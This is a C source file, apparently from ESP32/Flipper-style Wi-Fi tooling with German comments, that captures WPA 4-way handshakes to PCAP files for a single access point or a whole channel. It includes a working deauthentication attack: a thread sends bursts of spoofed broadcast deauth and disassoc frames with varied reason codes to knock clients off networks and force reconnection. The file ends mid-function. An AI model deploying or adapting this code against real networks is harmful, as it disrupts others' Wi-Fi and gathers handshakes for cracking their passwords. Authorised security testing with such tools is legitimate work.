#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_pcap.h"
#include "../wlan_handshake_parser.h"
#include <input/input.h>
#include <gui/elements.h>
#include <esp_log.h>
#include <esp_timer.h>
#include <esp_wifi.h>
#include <storage/storage.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <string.h>

#define TAG "WlanHs"

#define HS_CHANNEL_MIN 1
#define HS_CHANNEL_MAX 13

// ---------------------------------------------------------------------------
// Ring buffer (Single + Channel teilen sich den Buffer; nur ein Modus läuft).
// ---------------------------------------------------------------------------
#define HS_PKT_POOL_SIZE 32
#define HS_PKT_MAX_LEN 512

typedef struct {
    uint16_t len;
    uint32_t timestamp_us;
    uint8_t data[HS_PKT_MAX_LEN];
} HsPkt;

static HsPkt* s_pkt_pool = NULL;
static volatile uint32_t s_write_idx = 0;
static volatile uint32_t s_read_idx = 0;

// ---------------------------------------------------------------------------
// Single-Target-Capture-State
// ---------------------------------------------------------------------------
typedef struct {
    uint8_t bssid[6];
    bool has_beacon;
    bool has_m1, has_m2, has_m3, has_m4;
} HsSingleCapture;

static HsSingleCapture s_single;
static File* s_single_pcap = NULL;
static Storage* s_storage = NULL;
static uint32_t s_start_us = 0;

// Deauth-Frames für Single-Mode
static const uint8_t deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00,
};
static const uint8_t deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};

// Burst-Mode: kurzes Feuer, dann Stille, damit STA reconnecten und den 4-way
// Handshake komplettieren kann (sonst fliegt sie immer wieder vor M2/M3 raus).
// 8 Frame-Pairs ≈ 16 Frames werfen jede STA verlässlich raus; 3 s Stille reicht
// für Auth+Assoc+4-way (~500 ms–2 s).
#define HS_BURST_PAIRS         8
#define HS_BURST_FRAME_GAP_MS  5
#define HS_BURST_QUIET_MS      3000
#define HS_BURST_QUIET_TICK_MS 100

static uint8_t s_frame_deauth[26];
static uint8_t s_frame_disassoc[26];
static FuriThread* s_deauth_thread = NULL;

// ---------------------------------------------------------------------------
// Channel-Mode-Multi-Target-State
// ---------------------------------------------------------------------------
#define HSC_MAX_TARGETS 16

// Save-Path-Cache (gefüllt im on_enter aus app->hs_settings).
static const char* s_save_dir = NULL;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    bool has_beacon;
    bool has_m1, has_m2, has_m3, has_m4;
    File* pcap_file;
} HsChannelTarget;

static HsChannelTarget s_hsc_targets[HSC_MAX_TARGETS];
static uint8_t s_hsc_target_count = 0;
static char s_latest_hs_ssid[33];
static bool s_hsc_auto_mode;
static bool s_hsc_ok_held;

static bool s_hsc_dialog_open;

// Nach einem manuellen Channel-Wechsel pausieren wir die Capture für 1.5 s,
// damit der RX-Pfad sich auf den neuen Channel einrichtet und keine Stale-Frames
// vom alten Channel reinrutschen (Targets werden eh geleert).
#define HSC_SWITCH_GRACE_MS 1500

// Hopping ist kürzer: keine Liste-Reset, nur Radio-Settle. 1 Tick (250 ms) reicht.
#define HSC_HOP_GRACE_MS 250
static uint32_t s_hsc_grace_until;

// Hopping: alle ~3 s zum nächsten Channel.
#define HSC_HOP_DWELL_MS 3000
static uint32_t s_hsc_hop_next;

static bool s_hs_running;
static bool s_use_channel_mode; // wird in on_enter gesetzt

// ---------------------------------------------------------------------------
// Forward decls
// ---------------------------------------------------------------------------
static void hs_drain_and_process(WlanApp* app);
static void hsc_drain_and_process(WlanApp* app);

// ---------------------------------------------------------------------------
// SSID → safe filename
// ---------------------------------------------------------------------------
static void hs_sanitize_ssid(const char* ssid, const uint8_t* bssid, char* out, size_t out_len) {
    if(!ssid || ssid[0] == '\0') {
        snprintf(out, out_len, "%02X%02X%02X%02X%02X%02X",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        return;
    }
    size_t j = 0;
    for(size_t i = 0; ssid[i] && j < out_len - 1; i++) {
        char c = ssid[i];
        if((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '-' || c == '_') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = '\0';
}

static File* hs_open_pcap(Storage* storage, const char* dir, const char* safe_ssid) {
    storage_common_mkdir(storage, "/ext/wifi");
    storage_common_mkdir(storage, dir);
    char path[200];
    snprintf(path, sizeof(path), "%s/%s.pcap", dir, safe_ssid);
    if(storage_common_stat(storage, path, NULL) == FSE_OK) {
        for(int i = 1; i < 999; i++) {
            snprintf(path, sizeof(path), "%s/%s_%d.pcap", dir, safe_ssid, i);
            if(storage_common_stat(storage, path, NULL) != FSE_OK) break;
        }
    }
    return wlan_pcap_open(storage, path);
}

// ---------------------------------------------------------------------------
// Deauth-Thread (Single-Mode)
// ---------------------------------------------------------------------------
// Wartet HS_BURST_QUIET_MS in kleinen Schritten und bricht früh ab, sobald
// der Hauptthread Stop angefordert hat. Während dieser Stille hat die STA
// die Chance, den 4-way Handshake abzuschließen.
static void hs_deauth_quiet_window(WlanApp* app) {
    uint32_t ticks = HS_BURST_QUIET_MS / HS_BURST_QUIET_TICK_MS;
    for(uint32_t i = 0; i < ticks && app->handshake_deauth_running; i++) {
        furi_delay_ms(HS_BURST_QUIET_TICK_MS);
    }
}

// Schickt einen Deauth+Disassoc-Pair-Burst mit verschiedenen Reasons.
// f_deauth muss vorgefüllt sein (RA/TA/BSSID gesetzt). f_disassoc wird
// daraus abgeleitet (gleiche Adressen, nur subtype-Byte anders).
static uint32_t hs_deauth_burst(WlanApp* app, uint8_t* f_deauth) {
    uint8_t f_disassoc[26];
    memcpy(f_disassoc, f_deauth, 26);
    f_disassoc[0] = 0xa0;
    uint32_t sent = 0;
    for(int i = 0; i < HS_BURST_PAIRS && app->handshake_deauth_running; i++) {
        uint8_t reason = deauth_reasons[i % (sizeof(deauth_reasons))];
        f_deauth[24] = reason;
        f_disassoc[24] = reason;
        if(wlan_hal_send_raw(f_deauth, 26)) {
            app->handshake_deauth_count++;
            sent++;
        }
        if(wlan_hal_send_raw(f_disassoc, 26)) {
            app->handshake_deauth_count++;
            sent++;
        }
        furi_delay_ms(HS_BURST_FRAME_GAP_MS);
    }
    return sent;
}

static int32_t hs_deauth_thread_fn(void* arg) {
    WlanApp* app = arg;
    uint32_t burst_no = 0;
    uint32_t no_target_log_count = 0;
    ESP_LOGI(TAG, "deauth thread: started (channel_mode=%d, burst=%dx pair, quiet=%dms)",
        s_use_channel_mode, HS_BURST_PAIRS, HS_BURST_QUIET_MS);

    while(app->handshake_deauth_running) {
        if(s_use_channel_mode) {
            uint8_t count = s_hsc_target_count;
            if(count > HSC_MAX_TARGETS) count = HSC_MAX_TARGETS;
            if(count == 0) {
                if((no_target_log_count++ & 0x1F) == 0) {
                    ESP_LOGW(TAG, "deauth thread: no targets yet — waiting");
                }
                furi_delay_ms(200);
                continue;
            }
            // Pro Burst zur nächsten BSSID rotieren — jeder AP bekommt einen
            // ganzen Burst (16 Frames) am Stück, dann Stille.
            uint8_t idx = burst_no % count;
            uint8_t bssid[6];
            memcpy(bssid, s_hsc_targets[idx].bssid, 6);

            uint8_t f[26];
            memcpy(f, deauth_tmpl, 26);
            memcpy(&f[10], bssid, 6);
            memcpy(&f[16], bssid, 6);

            uint32_t sent = hs_deauth_burst(app, f);
            if((burst_no & 0x03) == 0) {
                ESP_LOGI(TAG,
                    "burst #%lu targets=%u idx=%u "
                    "bssid=%02x:%02x:%02x:%02x:%02x:%02x sent=%lu total=%lu",
                    (unsigned long)burst_no, count, idx,
                    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                    (unsigned long)sent,
                    (unsigned long)app->handshake_deauth_count);
            }
        } else {
            // Single-Mode: BSSID ist in s_frame_deauth schon gesetzt (hs_init_single).
            // Wir kopieren in einen lokalen Buffer, damit hs_deauth_burst beide
            // Frames daraus baut.
            uint8_t f[26];
            memcpy(f, s_frame_deauth, 26);
            uint32_t sent = hs_deauth_burst(app, f);
            if((burst_no & 0x03) == 0) {
                ESP_LOGI(TAG, "burst #%lu single sent=%lu total=%lu",
                    (unsigned long)burst_no, (unsigned long)sent,
                    (unsigned long)app->handshake_deauth_count);
            }
        }
        burst_no++;

        // Stille — STA bekommt Chance auf Reconnect + 4-way.
        hs_deauth_quiet_window(app);
    }
    ESP_LOGI(TAG, "deauth thread: exiting (bursts=%lu sent=%lu)",
        (unsigned long)burst_no, (unsigned long)app->handshake_deauth_count);
    return 0;
}

static void hs_start_deauth(WlanApp* app) {
    if(s_deauth_thread) {
        ESP_LOGI(TAG, "start_deauth: already running");
        return;
    }
    // Im Single-Mode nur wenn Capture läuft; im Channel-Mode immer erlaubt.
    if(!s_use_channel_mode && !app->handshake_running) {
        ESP_LOGW(TAG, "start_deauth: single mode, capture not running — skip");
        return;
    }
    // Im Channel-Mode mit Hopping=ON ist Deauth gesperrt — Channel würde mitten
    // im Deauth-Stream wechseln und der Effekt verpufft.
    if(s_use_channel_mode && app->hs_settings.hopping) {
        ESP_LOGW(TAG, "start_deauth: channel mode + hopping ON — blocked");
        return;
    }
    ESP_LOGI(TAG, "start_deauth: spawning thread (channel_mode=%d targets=%u)",
        s_use_channel_mode, s_hsc_target_count);
    app->handshake_deauth_running = true;
    app->handshake_deauth_count = 0;
    s_deauth_thread = furi_thread_alloc();
    furi_thread_set_name(s_deauth_thread, "HsDeauth");
    furi_thread_set_stack_size(s_deauth_thread, 2048);
    furi_thread_set_context(s_deauth_thread, app);
    furi_thread_set_callback(s_deauth_thread, hs_deauth_thread_fn);
    furi_thread_start(s_deauth_thread);
}

static void hs_stop_deauth(WlanApp* app) {
    if(!s_deauth_thread) {
        app->handshake_deauth_running = false;
        return;
    }
    ESP_LOGI(TAG, "stop_deauth: joining thread");
    app->handshake_deauth_running = false;
    furi_thread_join(s_deauth_thread);
    furi_thread_free(s_deauth_thread);
    s_deauth_thread = NULL;
}

// ---------------------------------------------------------------------------
// Single-Mode: Promiscuous-Callback + Packet-Processing
// ---------------------------------------------------------------------------
static void hs_rx_callback_single(void* buf, wifi_promiscuous_pkt_type_t type) {
    UNUSED(type);
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if(len < 24 || len > HS_PKT_MAX_LEN) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frame_type = (fc & 0x0C) >> 2;
    uint8_t frame_subtype = (fc & 0xF0) >> 4;

    if(frame_type == 0 && frame_subtype == 8) {
        if(memcmp(&payload[16], s_single.bssid, 6) != 0) return;
    } else if(frame_type == 2) {
        int hdr_len = 24;
        uint8_t to_ds = (fc & 0x0100) >> 8;
        uint8_t from_ds = (fc & 0x0200) >> 9;
        if(to_ds && from_ds) hdr_len = 30;
        if((frame_subtype & 0x08) == 0x08) hdr_len += 2;
        if(len < hdr_len + 8) return;
        const uint8_t* llc = &payload[hdr_len];
        if(!(llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x88 && llc[7] == 0x8E)) return;
    } else {
        return;
    }

    uint32_t next = (s_write_idx + 1) % HS_PKT_POOL_SIZE;
    if(next == s_read_idx) return;
    HsPkt* slot = &s_pkt_pool[s_write_idx];
    memcpy(slot->data, payload, len);
    slot->len = len;
    slot->timestamp_us = pkt->rx_ctrl.timestamp;
    s_write_idx = next;
}

static uint8_t hs_process_packet_single(const uint8_t* payload, int len) {
    if(wlan_hs_is_beacon(payload, len)) {
        if(memcmp(&payload[16], s_single.bssid, 6) == 0) s_single.has_beacon = true;
        return 0;
    }
    uint16_t fc = payload[0] | (payload[1] << 8);
    if(((fc & 0x0C) >> 2) != 2) return 0;
    const uint8_t* bssid = NULL;
    const uint8_t* station = NULL;
    const uint8_t* ap = NULL;
    int header_len = 0;
    if(!wlan_hs_parse_addresses(payload, len, &bssid, &station, &ap, &header_len)) return 0;
    if(memcmp(bssid, s_single.bssid, 6) != 0) return 0;
    if(!wlan_hs_is_eapol(payload, header_len, len)) return 0;
    const uint8_t* eapol = &payload[header_len + 8];
    int eapol_len = len - header_len - 8;
    uint8_t msg = wlan_hs_get_eapol_msg_num(eapol, eapol_len);
    switch(msg) {
    case 1: s_single.has_m1 = true; break;
    case 2: s_single.has_m2 = true; break;
    case 3: s_single.has_m3 = true; break;
    case 4: s_single.has_m4 = true; break;
    default: break;
    }
    return msg;
}

static void hs_drain_and_process(WlanApp* app) {
    while(s_read_idx != s_write_idx) {
        HsPkt* pkt = &s_pkt_pool[s_read_idx];
        uint8_t msg = hs_process_packet_single(pkt->data, pkt->len);
        if(msg > 0) app->handshake_eapol_count++;
        if(s_single_pcap) {
            wlan_pcap_write_packet(s_single_pcap, pkt->timestamp_us, pkt->data, pkt->len);
        }
        s_read_idx = (s_read_idx + 1) % HS_PKT_POOL_SIZE;
    }
}

static bool hs_single_complete(void) {
    return s_single.has_m2 && s_single.has_m3;
}

// ---------------------------------------------------------------------------
// Channel-Mode: Multi-Target-Capture
// ---------------------------------------------------------------------------
static HsChannelTarget* hsc_find_target(const uint8_t* bssid) {
    for(int i = 0; i < s_hsc_target_count; i++) {
        if(memcmp(s_hsc_targets[i].bssid, bssid, 6) == 0) return &s_hsc_targets[i];
    }
    return NULL;
}

static HsChannelTarget* hsc_find_or_create(const uint8_t* bssid) {
    HsChannelTarget* t = hsc_find_target(bssid);
    if(t) return t;
    if(s_hsc_target_count >= HSC_MAX_TARGETS) return NULL;
    t = &s_hsc_targets[s_hsc_target_count++];
    memset(t, 0, sizeof(*t));
    memcpy(t->bssid, bssid, 6);
    return t;
}

static void hsc_ensure_pcap(HsChannelTarget* t) {
    if(t->pcap_file || !s_storage || !s_save_dir) return;
    char safe[64];
    hs_sanitize_ssid(t->ssid, t->bssid, safe, sizeof(safe));
    t->pcap_file = hs_open_pcap(s_storage, s_save_dir, safe);
}

static void hsc_process_packet(const uint8_t* payload, int len, uint32_t timestamp_us) {
    if(wlan_hs_is_beacon(payload, len)) {
        const uint8_t* bssid = &payload[16];
        HsChannelTarget* t = hsc_find_or_create(bssid);
        if(!t) return;
        if(!t->has_beacon) {
            t->has_beacon = true;
            if(t->ssid[0] == '\0') wlan_hs_extract_beacon_ssid(payload, len, t->ssid, sizeof(t->ssid));
        }
        // Beacons werden nur dann ins PCAP geschrieben, wenn die Datei bereits
        // durch ein EAPOL-Frame angelegt wurde — sonst würden wir für jede
        // beobachtete BSSID eine leere PCAP erzeugen.
        if(t->pcap_file) wlan_pcap_write_packet(t->pcap_file, timestamp_us, payload, len);
        return;
    }
    uint16_t fc = payload[0] | (payload[1] << 8);
    if(((fc & 0x0C) >> 2) != 2) return;
    const uint8_t* bssid = NULL;
    const uint8_t* station = NULL;
    const uint8_t* ap = NULL;
    int header_len = 0;
    if(!wlan_hs_parse_addresses(payload, len, &bssid, &station, &ap, &header_len)) return;
    if(!wlan_hs_is_eapol(payload, header_len, len)) return;
    const uint8_t* eapol = &payload[header_len + 8];
    int eapol_len = len - header_len - 8;
    uint8_t msg = wlan_hs_get_eapol_msg_num(eapol, eapol_len);
    if(msg == 0) return;

    HsChannelTarget* t = hsc_find_or_create(bssid);
    if(!t) return;
    bool was_complete = t->has_m2 && t->has_m3;
    switch(msg) {
    case 1: t->has_m1 = true; break;
    case 2: t->has_m2 = true; break;
    case 3: t->has_m3 = true; break;
    case 4: t->has_m4 = true; break;
    }
    bool now_complete = t->has_m2 && t->has_m3;
    if(!was_complete && now_complete) {
        // Frischer Complete-Handshake → SSID merken.
        memset(s_latest_hs_ssid, 0, sizeof(s_latest_hs_ssid));
        const char* src = t->ssid[0] ? t->ssid : "?";
        strncpy(s_latest_hs_ssid, src, sizeof(s_latest_hs_ssid) - 1);
    }
    hsc_ensure_pcap(t);
    if(t->pcap_file) wlan_pcap_write_packet(t->pcap_file, timestamp_us, payload, len);
}

static void hs_rx_callback_channel(void* buf, wifi_promiscuous_pkt_type_t type) {
    UNUSED(type);
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if(len < 24 || len > HS_PKT_MAX_LEN) return;

    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frame_type = (fc & 0x0C) >> 2;
    uint8_t frame_subtype = (fc & 0xF0) >> 4;
    if(frame_type == 0 && frame_subtype == 8) {
        // Beacons immer akzeptieren (auch wenn target list voll, wenn known BSSID)
        if(s_hsc_target_count >= HSC_MAX_TARGETS) {
            const uint8_t* bssid = &payload[16];
            bool known = false;
            for(int i = 0; i < s_hsc_target_count; i++) {
                if(memcmp(s_hsc_targets[i].bssid, bssid, 6) == 0) { known = true; break; }
            }
            if(!known) return;
        }
    } else if(frame_type == 2) {
        int hdr_len = 24;
        uint8_t to_ds = (fc & 0x0100) >> 8;
        uint8_t from_ds = (fc & 0x0200) >> 9;
        if(to_ds && from_ds) hdr_len = 30;
        if((frame_subtype & 0x08) == 0x08) hdr_len += 2;
        if(len < hdr_len + 8) return;
        const uint8_t* llc = &payload[hdr_len];
        if(!(llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x88 && llc[7] == 0x8E)) return;
    } else {
        return;
    }

    uint32_t next = (s_write_idx + 1) % HS_PKT_POOL_SIZE;
    if(next == s_read_idx) return;
    HsPkt* slot = &s_pkt_pool[s_write_idx];
    memcpy(slot->data, payload, len);
    slot->len = len;
    slot->timestamp_us = pkt->rx_ctrl.timestamp;
    s_write_idx = next;
}

static void hsc_drain_and_process(WlanApp* app) {
    UNUSED(app);
    while(s_read_idx != s_write_idx) {
        HsPkt* pkt = &s_pkt_pool[s_read_idx];
        hsc_process_packet(pkt->data, pkt->len, pkt->timestamp_us);
        s_read_idx = (s_read_idx + 1) % HS_PKT_POOL_SIZE;
    }
}

static void hsc_publish_view(WlanApp* app) {
    uint8_t complete = 0;
    for(int i = 0; i < s_hsc_target_count; i++) {
        if(s_hsc_targets[i].has_m2 && s_hsc_targets[i].has_m3) complete++;
    }

    WlanHsChannelViewModel* m = view_get_model(app->view_handshake_channel);
    m->channel = app->channel_action_channel;
    m->running = s_hs_running;
    m->count = s_hsc_target_count;
    m->hs_complete_count = complete;
    m->deauth_active = app->handshake_deauth_running;
    m->deauth_frames = app->handshake_deauth_count;
    m->auto_mode = s_hsc_auto_mode;
    m->hopping = app->hs_settings.hopping;
    strncpy(m->latest_handshake_ssid, s_latest_hs_ssid, sizeof(m->latest_handshake_ssid) - 1);
    m->latest_handshake_ssid[sizeof(m->latest_handshake_ssid) - 1] = 0;
    view_commit_model(app->view_handshake_channel, true);
}

static void hsc_close_pcaps(void) {
    for(int i = 0; i < s_hsc_target_count; i++) {
        if(s_hsc_targets[i].pcap_file) {
            wlan_pcap_close(s_hsc_targets[i].pcap_file);
            s_hsc_targets[i].pcap_file = NULL;
        }
    }
}

static void hsc_clear_targets(void) {
    hsc_close_pcaps();
    memset(s_hsc_targets, 0, sizeof(s_hsc_targets));
    s_hsc_target_count = 0;
    s_write_idx = 0;
    s_read_idx = 0;
    s_latest_hs_ssid[0] = 0;
}

// ---------------------------------------------------------------------------
// Channel-Switch-Confirm-Dialog (Channel-Mode)
// ---------------------------------------------------------------------------
static void hsc_dialog_yes_cb(GuiButtonType result, InputType type, void* context) {
    WlanApp* app = context;
    if(type == InputTypeShort && result == GuiButtonTypeRight) {
        view_dispatcher_send_custom_event(
            app->view_dispatcher, WlanAppCustomEventHandshakeChannelConfirm);
    }
}

static void hsc_dialog_no_cb(GuiButtonType result, InputType type, void* context) {
    WlanApp* app = context;
    if(type == InputTypeShort && result == GuiButtonTypeLeft) {
        view_dispatcher_send_custom_event(
            app->view_dispatcher, WlanAppCustomEventHandshakeChannelCancel);
    }
}

static void hsc_open_switch_dialog(WlanApp* app, uint8_t pending_channel) {
    app->hs_channel_pending = pending_channel;
    s_hsc_dialog_open = true;
    // Capture pausieren — der User entscheidet gleich entweder Switch (Liste
    // wird sowieso geleert) oder Cancel (dann reaktivieren wir).
    wlan_hal_set_promiscuous(false, NULL);
    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 22, AlignCenter, AlignBottom, FontPrimary, "Switch to");
    char line[24];
    snprintf(line, sizeof(line), "Channel %u?", (unsigned)pending_channel);
    widget_add_string_element(
        app->widget, 64, 38, AlignCenter, AlignBottom, FontPrimary, line);
    widget_add_button_element(app->widget, GuiButtonTypeLeft, "No", hsc_dialog_no_cb, app);
    widget_add_button_element(app->widget, GuiButtonTypeRight, "Yes", hsc_dialog_yes_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewWidget);
}

static void hsc_close_dialog(WlanApp* app) {
    widget_reset(app->widget);
    s_hsc_dialog_open = false;
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewHandshakeChannel);
}

static void hsc_switch_channel(WlanApp* app) {
    // Promiscuous off + Liste leeren + Channel umsetzen.
    // Promiscuous bleibt aus — Tick-Handler reaktiviert nach Grace-Window.
    wlan_hal_set_promiscuous(false, NULL);
    hsc_clear_targets();
    wlan_hal_set_channel(app->channel_action_channel);
    s_hsc_grace_until = furi_get_tick() + HSC_SWITCH_GRACE_MS;
}

// ---------------------------------------------------------------------------
// Setup / Teardown
// ---------------------------------------------------------------------------
static const WlanApRecord* hs_pick_target(const WlanApp* app) {
    if(app->target_ap.ssid[0]) return &app->target_ap;
    if(app->connected) return &app->connected_ap;
    return NULL;
}

static void hs_init_single(WlanApp* app) {
    memset(&s_single, 0, sizeof(s_single));
    s_write_idx = 0;
    s_read_idx = 0;

    const WlanApRecord* target = hs_pick_target(app);
    if(target) {
        memcpy(s_single.bssid, target->bssid, 6);
        memcpy(s_frame_deauth, deauth_tmpl, 26);
        memcpy(&s_frame_deauth[10], target->bssid, 6);
        memcpy(&s_frame_deauth[16], target->bssid, 6);
        memcpy(s_frame_disassoc, s_frame_deauth, 26);
        s_frame_disassoc[0] = 0xa0;
    }

    // WiFi-Stack starten (falls Connect übersprungen wurde)
    if(!wlan_hal_is_started()) wlan_hal_start();
    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    // Channel setzen + Storage/PCAP nur bei vorhandenem Target — sonst entstünden
    // leere PCAPs mit Zero-BSSID-Namen und Promiscuous würde ohne Verbraucher laufen.
    if(target) {
        wlan_hal_set_channel(target->channel ? target->channel : 1);
        s_storage = furi_record_open(RECORD_STORAGE);
        char safe[64];
        hs_sanitize_ssid(target->ssid, target->bssid, safe, sizeof(safe));
        s_single_pcap = hs_open_pcap(s_storage, s_save_dir, safe);
    }

    // View-Model initialisieren
    WlanHandshakeViewModel* m = view_get_model(app->view_handshake);
    memset(m, 0, sizeof(*m));
    if(target) {
        strncpy(m->ssid, target->ssid[0] ? target->ssid : "(hidden)", sizeof(m->ssid) - 1);
        memcpy(m->bssid, target->bssid, 6);
        m->channel = target->channel;
    } else {
        strncpy(m->ssid, "(no target)", sizeof(m->ssid) - 1);
    }
    m->channel_mode = false;
    view_commit_model(app->view_handshake, true);
}

static void hs_init_channel(WlanApp* app) {
    // Channel kommt aus den persistenten Settings.
    if(app->hs_settings.channel < HS_CHANNEL_MIN ||
       app->hs_settings.channel > HS_CHANNEL_MAX) {
        app->hs_settings.channel = HS_CHANNEL_MIN;
    }
    app->channel_action_channel = app->hs_settings.channel;
    hsc_clear_targets();

    if(!wlan_hal_is_started()) wlan_hal_start();
    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    wlan_hal_set_channel(app->channel_action_channel);
    wlan_hal_set_promiscuous(true, hs_rx_callback_channel);

    s_storage = furi_record_open(RECORD_STORAGE);

    WlanHsChannelViewModel* m = view_get_model(app->view_handshake_channel);
    memset(m, 0, sizeof(*m));
    m->channel = app->channel_action_channel;
    m->running = true;
    view_commit_model(app->view_handshake_channel, true);
}

void wlan_app_scene_handshake_on_enter(void* context) {
    WlanApp* app = context;
    s_hs_running = false;
    s_hsc_dialog_open = false;
    s_hsc_grace_until = 0;
    s_hsc_hop_next = 0;
    s_use_channel_mode = app->channel_mode_active;
    s_hsc_auto_mode = false;
    s_hsc_ok_held = false;
    // Save-Path-Cache an Settings binden.
    s_save_dir = app->hs_settings.save_path;
    app->handshake_running = false;
    app->handshake_complete = false;
    app->handshake_deauth_running = false;
    app->handshake_eapol_count = 0;
    app->handshake_deauth_count = 0;

    if(!s_pkt_pool) {
        s_pkt_pool = malloc(sizeof(HsPkt) * HS_PKT_POOL_SIZE);
    }

    if(s_use_channel_mode) {
        hs_init_channel(app);
        s_hs_running = true; // Channel-Mode startet sofort
        if(app->hs_settings.hopping) {
            s_hsc_hop_next = furi_get_tick() + HSC_HOP_DWELL_MS;
        }
        view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewHandshakeChannel);
    } else {
        hs_init_single(app);
        // Auto-Start nur bei konkretem Target.
        if(app->target_ap.ssid[0]) {
            app->handshake_running = true;
            s_start_us = (uint32_t)(esp_timer_get_time() / 1000000);
            wlan_hal_set_promiscuous(true, hs_rx_callback_single);
            s_hs_running = true;
        }
        view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewHandshake);
    }
}

bool wlan_app_scene_handshake_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(s_use_channel_mode) {
            if(event.event == WlanAppCustomEventHandshakeDeauthStart) {
                s_hsc_ok_held = true;
                hs_start_deauth(app);
                consumed = true;
            } else if(event.event == WlanAppCustomEventHandshakeDeauthStop) {
                s_hsc_ok_held = false;
                // Nur stoppen, wenn Auto NICHT aktiv ist.
                if(!s_hsc_auto_mode) hs_stop_deauth(app);
                consumed = true;
            } else if(event.event == WlanAppCustomEventHandshakeAutoToggle) {
                if(!app->hs_settings.hopping) {
                    s_hsc_auto_mode = !s_hsc_auto_mode;
                    if(s_hsc_auto_mode) {
                        hs_start_deauth(app);
                    } else if(!s_hsc_ok_held) {
                        hs_stop_deauth(app);
                    }
                }
                consumed = true;
            } else if(event.event == WlanAppCustomEventHandshakeSettingsOpen) {
                scene_manager_next_scene(app->scene_manager, WlanAppSceneHandshakeSettings);
                consumed = true;
            } else if(event.event == WlanAppCustomEventHandshakeChannelUp) {
                uint8_t next = (app->channel_action_channel >= HS_CHANNEL_MAX)
                                   ? HS_CHANNEL_MIN
                                   : (uint8_t)(app->channel_action_channel + 1);
                if(s_hsc_target_count > 0) {
                    hsc_open_switch_dialog(app, next);
                } else {
                    app->channel_action_channel = next;
                    hsc_switch_channel(app);
                }
                consumed = true;
            } else if(event.event == WlanAppCustomEventHandshakeChannelDown) {
                uint8_t next = (app->channel_action_channel <= HS_CHANNEL_MIN)
                                   ? HS_CHANNEL_MAX
                                   : (uint8_t)(app->channel_action_channel - 1);
                if(s_hsc_target_count > 0) {
                    hsc_open_switch_dialog(app, next);
                } else {
                    app->channel_action_channel = next;
                    hsc_switch_channel(app);
                }
                consumed = true;
            } else if(event.event == WlanAppCustomEventHandshakeChannelConfirm) {
                app->channel_action_channel = app->hs_channel_pending;
                hsc_switch_channel(app);
                hsc_close_dialog(app);
                consumed = true;
            } else if(event.event == WlanAppCustomEventHandshakeChannelCancel) {
                hsc_close_dialog(app);
                // Capture wieder anwerfen — wir bleiben auf demselben Channel.
                wlan_hal_set_promiscuous(true, hs_rx_callback_channel);
                consumed = true;
            }
            return consumed;
        }

        // Single-Target-Mode
        if(event.event == WlanAppCustomEventHandshakeDeauthStart && app->handshake_running) {
            hs_start_deauth(app);
            consumed = true;
        } else if(event.event == WlanAppCustomEventHandshakeDeauthStop) {
            hs_stop_deauth(app);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        if(s_use_channel_mode) {
            uint32_t now = furi_get_tick();
            // Grace-Window nach einem Channel-Wechsel.
            if(s_hsc_grace_until && now >= s_hsc_grace_until) {
                s_hsc_grace_until = 0;
                wlan_hal_set_promiscuous(true, hs_rx_callback_channel);
            }
            // Hopping: alle ~3 s nächster Channel (Liste bleibt erhalten,
            // ausschließlich durch Settings.hopping gesteuert).
            // Wir setzen das Grace-Window — der nächste Tick reaktiviert Promisc,
            // damit der Dispatcher-Tick nicht blockiert wird (kein furi_delay_ms).
            if(app->hs_settings.hopping && s_hsc_hop_next && now >= s_hsc_hop_next) {
                uint8_t next = (app->channel_action_channel >= HS_CHANNEL_MAX)
                                   ? HS_CHANNEL_MIN
                                   : (uint8_t)(app->channel_action_channel + 1);
                app->channel_action_channel = next;
                wlan_hal_set_promiscuous(false, NULL);
                wlan_hal_set_channel(next);
                s_hsc_grace_until = now + HSC_HOP_GRACE_MS;
                s_hsc_hop_next = now + HSC_HOP_DWELL_MS;
            }
            if(s_hs_running) {
                hsc_drain_and_process(app);
                hsc_publish_view(app);
            }
        } else if(app->handshake_running) {
            hs_drain_and_process(app);

            if(hs_single_complete() && !app->handshake_complete) {
                app->handshake_complete = true;
                app->handshake_running = false;
                wlan_hal_set_promiscuous(false, NULL);
                if(app->handshake_deauth_running) hs_stop_deauth(app);
                hs_drain_and_process(app);
                if(s_single_pcap) {
                    wlan_pcap_close(s_single_pcap);
                    s_single_pcap = NULL;
                }
                ESP_LOGI(TAG, "*** Handshake complete ***");
            }

            WlanHandshakeViewModel* m = view_get_model(app->view_handshake);
            m->running = app->handshake_running;
            m->deauth_active = app->handshake_deauth_running;
            m->has_beacon = s_single.has_beacon;
            m->has_m1 = s_single.has_m1;
            m->has_m2 = s_single.has_m2;
            m->has_m3 = s_single.has_m3;
